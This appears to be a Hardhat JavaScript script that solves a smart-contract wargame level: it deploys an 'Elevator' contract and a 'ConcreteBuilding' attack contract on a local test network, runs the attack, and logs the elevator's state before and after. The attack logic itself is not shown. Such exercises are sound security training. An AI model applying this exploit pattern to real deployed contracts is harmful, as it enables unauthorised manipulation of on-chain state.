const {ethers} = require("hardhat");
const hre = require("hardhat");

async function main() {
    const accounts = await ethers.getSigners();
    const baseContractFactory = await hre.ethers.getContractFactory('Elevator');

    const elevatorContract = await baseContractFactory.connect(accounts[1]).deploy();
    await elevatorContract.deployed();


    console.log(elevatorContract.address)
    const attackContractFactory = await hre.ethers.getContractFactory('ConcreteBuilding');
    const attackElevatorContract = await attackContractFactory.connect(accounts[2]).deploy(accounts[2].address);


    await attackElevatorContract.deployed();

    await attackElevatorContract.setContract(elevatorContract.address.toString());

    console.log(parseInt((await elevatorContract.floor()), 10));
    console.log((await elevatorContract.top()));
    const tnx = await attackElevatorContract.connect(accounts[2]).attack(1000);
    await tnx.wait();
    console.log(parseInt((await elevatorContract.floor()), 10));
    console.log((await elevatorContract.top()));
}

main();